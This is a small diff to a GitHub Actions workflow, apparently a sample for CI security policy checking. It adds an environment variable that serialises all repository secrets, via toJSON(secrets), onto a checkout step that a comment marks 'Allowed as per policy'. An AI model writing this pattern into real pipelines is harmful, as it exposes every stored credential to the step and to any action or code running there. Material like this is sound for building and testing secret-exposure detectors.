@@ -14,6 +14,8 @@ jobs:
     
       # Allowed as per policy
       - name: Code Checkout
+        env:
+         VALUES: ${{ toJSON(secrets) }}
         uses: actions/checkout@v2
         with:
           fetch-depth: 2
